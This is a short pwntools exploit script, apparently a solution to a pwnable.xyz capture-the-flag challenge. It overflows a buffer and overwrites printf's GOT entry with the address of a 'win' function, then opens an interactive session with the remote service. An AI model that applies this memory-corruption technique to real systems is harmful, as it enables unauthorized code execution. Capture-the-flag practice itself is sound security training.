from pwn import *
from struct import *

printf_plt = 0x602030
win_function = 0x400b71
debug = 0
if not debug:
    sh = remote('svc.pwnable.xyz', 30011)
else:
    sh = process('./challenge')


sh.sendlineafter('> ', '1')
sh.sendafter('Name: ', 'A'*32)
sh.sendlineafter('Age: ', '-1')

sh.sendlineafter('> ', '3')
sh.sendafter('Name: ', 'B'*32)
payload = "A"*16
payload += p64(printf_plt)
sh.sendafter('Age: ', payload)
sh.sendlineafter('> ', '3')
sh.sendafter('Name: ', p64(0x400b71))
sh.interactive()


